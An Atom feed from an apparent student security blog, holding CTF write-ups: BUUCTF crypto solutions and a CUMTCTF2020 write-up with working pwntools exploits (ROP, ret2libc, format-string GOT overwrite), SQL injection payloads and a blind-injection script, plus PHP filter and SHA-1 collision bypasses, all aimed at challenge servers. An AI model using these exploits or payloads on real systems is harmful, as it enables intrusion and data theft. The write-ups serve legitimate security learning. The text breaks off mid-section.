<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>R4in1&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/7bad76cc358398f53210bf07081edb51</icon>
  <subtitle>The world is not perfect, but still wonderful.</subtitle>
  <link href="https://r4in1.github.io/atom.xml" rel="self"/>
  
  <link href="https://r4in1.github.io/"/>
  <updated>2020-12-02T12:48:50.918Z</updated>
  <id>https://r4in1.github.io/</id>
  
  <author>
    <name>R4in1</name>
    <email>1582612801@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF CRYPTO分类部分题解</title>
    <link href="https://r4in1.github.io/2020/12/02/BUUCTF-CRYPTO%E5%88%86%E7%B1%BB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>https://r4in1.github.io/2020/12/02/BUUCTF-CRYPTO%E5%88%86%E7%B1%BB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2020-12-02T12:47:28.000Z</published>
    <updated>2020-12-02T12:48:50.918Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>题目给了md5值，查彩虹表得到flag<br><a href="https://cmd5.com/">https://cmd5.com</a></p><h3 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h3><p><code>&#123;&#125;</code>字符位置没变，凯撒密码，位移量13<br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><h3 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h3><p>如题目，UrlDecode得到flag<br><a href="http://tool.chinaz.com/tools/urlencode.aspx">http://tool.chinaz.com/tools/urlencode.aspx</a></p><h3 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h3><p>base64解码<br><a href="http://tool.chinaz.com/tools/base64.aspx">http://tool.chinaz.com/tools/base64.aspx</a></p><h3 id="摩丝"><a href="#摩丝" class="headerlink" title="摩丝"></a>摩丝</h3><p>摩斯密码(mdzz注意要提交大写字母)<br><a href="http://moersima.00cha.net/">http://moersima.00cha.net</a></p><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><p>根据flag{}的格式，可以判断位移量是递增的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span></span><br><span class="line">ans=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> x:</span><br><span class="line">    ans+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s)+i)</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>姓名：张三<br>生日：19900315</p><p>key格式为key{xxxxxxxxxx}<br>zs19900315长度刚好够</p><h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">x=<span class="string">&#x27;=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6&#x27;</span><span class="comment">#密文</span></span><br><span class="line">ans=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> x:</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        ans+=<span class="string">&#x27;%&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ans+=s</span><br><span class="line">print(urllib.parse.unquote(ans))</span><br></pre></td></tr></table></figure><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>winhex修改加密标志位<br><a href="https://blog.csdn.net/qq_34072526/article/details/87205396">https://blog.csdn.net/qq_34072526/article/details/87205396</a></p><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><p><a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a><br><a href="https://blog.csdn.net/myspacedemen/article/details/51433426">https://blog.csdn.net/myspacedemen/article/details/51433426</a></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>RSA：<br><a href="https://www.jianshu.com/p/fbb8bf7baa97">https://www.jianshu.com/p/fbb8bf7baa97</a><br>扩展欧几里得算法：<br><a href="https://blog.csdn.net/destiny1507/article/details/81750874">https://blog.csdn.net/destiny1507/article/details/81750874</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>栅栏密码，分13栏<br><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p><h3 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h3><p>下载下来是个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">&#x27;TASC&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;WDJKX&#x27;</span>+<span class="built_in">chr</span>(k)+<span class="string">&#x27;ZM&#x27;</span>)</span><br><span class="line">            des = m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="built_in">print</span> des</span><br></pre></td></tr></table></figure><p>因为我安装的是python3.8，所以不能直接运行，给update的字符串加上<code>encode(&#39;utf-8&#39;)</code>，print函数加上括号，执行之后加上flag{}提交即可</p><h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><p>数比较小，直接循环算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">98554799767</span></span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">pow</span>(x, <span class="number">0.5</span>):</span><br><span class="line">    <span class="keyword">if</span> x % i == <span class="number">0</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        print(x/i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-老文盲了"><a href="#BJDCTF-2nd-老文盲了" class="headerlink" title="[BJDCTF 2nd]老文盲了"></a>[BJDCTF 2nd]老文盲了</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</span><br></pre></td></tr></table></figure><p>吐了，原来是拼音</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">淛匶襫黼瀬鎶軄鶛驕鳓哵</span><br></pre></td></tr></table></figure><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><p>惊了，这么大的数，求幂居然能直接算？？！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q &#x3D; 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line">d &#x3D; pow(e, -1, (p-1)*(q-1))</span><br><span class="line">print(pow(c, d, p*q))</span><br></pre></td></tr></table></figure><h3 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h3><p>pass.hash，纯文本文档，直接改成txt在彩虹表里查<br><a href="https://pmd5.com/">https://pmd5.com/</a><br><a href="https://www.somd5.com/">https://www.somd5.com/</a><br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><a href="https://www.sojson.com/encrypt_md5.html">https://www.sojson.com/encrypt_md5.html</a><br>计算md5：<a href="https://md5jiami.51240.com/">https://md5jiami.51240.com/</a></p><h3 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h3><p>天干地支纪年法，转成对应的数字，“+甲子”指的是+60，然后按ascii转换，然后栅栏密码+凯撒密码</p><h3 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h3><p>凯撒密码，位移量13</p><h3 id="BJDCTF-2nd-cat-flag"><a href="#BJDCTF-2nd-cat-flag" class="headerlink" title="[BJDCTF 2nd]cat_flag"></a>[BJDCTF 2nd]cat_flag</h3><p>只有两种猫猫，一种对应1一种对应0，然后二进制转16进制，然后转字符串</p>]]></content>
    
    
    <summary type="html">BUUOJ crypto分类的一些题解</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="https://r4in1.github.io/categories/CTF/CRYPTO/"/>
    
    
    <category term="crypto" scheme="https://r4in1.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF2020-WP by Last_W1z4rd</title>
    <link href="https://r4in1.github.io/2020/12/02/CUMTCTF2020-WP-by-Last-W1z4rd/"/>
    <id>https://r4in1.github.io/2020/12/02/CUMTCTF2020-WP-by-Last-W1z4rd/</id>
    <published>2020-12-02T12:44:54.000Z</published>
    <updated>2020-12-02T12:46:34.574Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><hr><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>泄露canary，system(‘sh’)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./canary&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;202.119.201.197&quot;</span>,<span class="string">&quot;10004&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">56</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="number">56</span> * <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ca = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment">#log.info(&quot;Canary:&quot;+hex(ca))</span></span><br><span class="line">rdi_addr = <span class="number">0x4008e3</span></span><br><span class="line">shell_addr = <span class="number">0x400726</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start_main = 0x601040</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;__libc_start_main&quot;,start_main)</span></span><br><span class="line"><span class="comment"># base = start_main - libc.dump(&quot;__libc_start_main&quot;)</span></span><br><span class="line"><span class="comment"># binsh_addr = base + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="comment"># sys_addr = base + libc.dump(&quot;system&quot;)</span></span><br><span class="line">sh_addr = <span class="number">0x400904</span></span><br><span class="line">sys_addr = <span class="number">0x4005F0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">56</span> * <span class="string">b&quot;\x90&quot;</span> + p64(ca) + <span class="number">8</span> * <span class="string">b&quot;\x90&quot;</span> + p64(rdi_addr) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"><span class="comment">#ayload = flat([56*&#x27;a&#x27;,ca,8*&#x27;a&#x27;])</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="fmstr"><a href="#fmstr" class="headerlink" title="fmstr"></a>fmstr</h3><p>formatstr写got表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./cg&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;nidie&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x0804A068</span>:<span class="number">8</span>&#125;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>手动泄露libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./rop&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;202.119.201.197&quot;</span>,<span class="string">&quot;10001&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main_addr =  <span class="number">0x0804854E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">112</span>) * <span class="string">&#x27;a&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(libc_start_main_got)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;say:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">start_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>,start_addr)</span><br><span class="line">base = start_addr - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">sys_addr = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">112</span> * <span class="string">&#x27;a&#x27;</span> + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) +p32(binsh_addr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><hr><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>下载图片,winHex打开，最后面有源码，get两个参数 一个用数据流伪协议 data://传入Suvin_wants_a_girlfriend</p><p>另外一个param2参数在需要一个数值范围内，post两个参数，值不相等，sha1值相等，百度到两个pdf，前几百字符符合绕过条件url编码后上传得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://202.119.201.197:13005/index.php?param1=data:text/plain,Suvin_wants_a_girlfriend¶m2=0x278d01&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span> : <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36&quot;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload=&#123;<span class="string">&#x27;param1&#x27;</span>:<span class="string">&#x27;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;param2&#x27;</span>:<span class="string">&#x27;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">a=s.post(url,data=payload,headers=header).content</span><br><span class="line">content=<span class="built_in">str</span>(a,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment">#if len(content)&gt;2359:</span></span><br><span class="line"><span class="comment">#   print(i)</span></span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure><hr><h3 id="简单的文件包含"><a href="#简单的文件包含" class="headerlink" title="简单的文件包含"></a>简单的文件包含</h3><p>首先尝试XFF=127.0.0.1失败，最后添加了头client-ip=127.0.0.1 ，得到源码，需要绕过require_once，函数解析软连接时存在问题，无法多次解析绝对路径，用伪协议php;//filter读取文件，多次重复/proc/self/root/路径最后解析为var/www/html/flag.php，post参数f得到flag</p><hr><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.197:13001/?1=1&amp;file=php://filter/read/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">post data:</span><br><span class="line">2=2</span><br></pre></td></tr></table></figure><hr><h3 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8/**/#</span><br><span class="line">回显第四列</span><br><span class="line"></span><br><span class="line">username=1&amp;password=1&#x27;/**/union/**/select/**/1,2,3,database(),5,6,7,8/**/#</span><br><span class="line">cumtctf</span><br><span class="line"></span><br><span class="line">username=1&amp;password=1&#x27;/**/union/**/select/**/1,2,3,database(),5,6,7,8/**/#</span><br><span class="line">emails,users</span><br><span class="line"></span><br><span class="line">username=1&amp;password=1&#x27;/**/union/**/select/**/1,2,3,group_concat(column_name),5,6,7,8/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;#</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line">username=1&amp;password=1&#x27;/**/union/**/select/**/1,2,3,concat_ws(user_id,first_name,last_name,user,password,avatar,last_login,failed_login),5,6,7,8/**/from/**/cumtctf.users/**/limit/**/7,1#</span><br><span class="line">Hack8Me8Hacker8CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125;8&#123;$avatarUrl&#125;1337.jpg82020-09-21 13:21:0380</span><br></pre></td></tr></table></figure><hr><h3 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h3><p>以前好像做过类似的题，反斜线转义单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://202.119.201.197:13004/&#x27;</span></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rowlen = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):  <span class="comment"># get len</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;/**/or/**/(if((select/**/length(concat_ws(id,username,password))/**/from/**/cumtctf.users/**/limit/**/%i,1)&gt;%i,1,0))#&#x27;</span> % (row, <span class="built_in">len</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Wrong username&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">&quot;row &quot;</span> + <span class="built_in">str</span>(row) + <span class="string">&#x27;\&#x27;s length is: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">            print(<span class="string">&#x27;now row&#x27;</span> + <span class="built_in">str</span>(row) + <span class="string">&#x27;-----&#x27;</span>)</span><br><span class="line">            rowlen = <span class="built_in">len</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    words = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rowlen + <span class="number">1</span>):  <span class="comment"># get words</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;/**/or/**/(if(ord(right(left((select/**/concat_ws(id,username,password)/**/from/**/cumtctf.users/**/limit/**/%i,1),%i),1))=%i,1,0))#&#x27;</span> % (row, j, word)</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Wrong username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                words += <span class="built_in">chr</span>(word)</span><br><span class="line">                print(<span class="string">&quot;now words is: &quot;</span> + words)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><hr><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>拖入PEID无壳，IDA打开，shift+F12直接查看字符串，得到解。</p><hr><h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p>UPX-d + IDA+ SHITF + 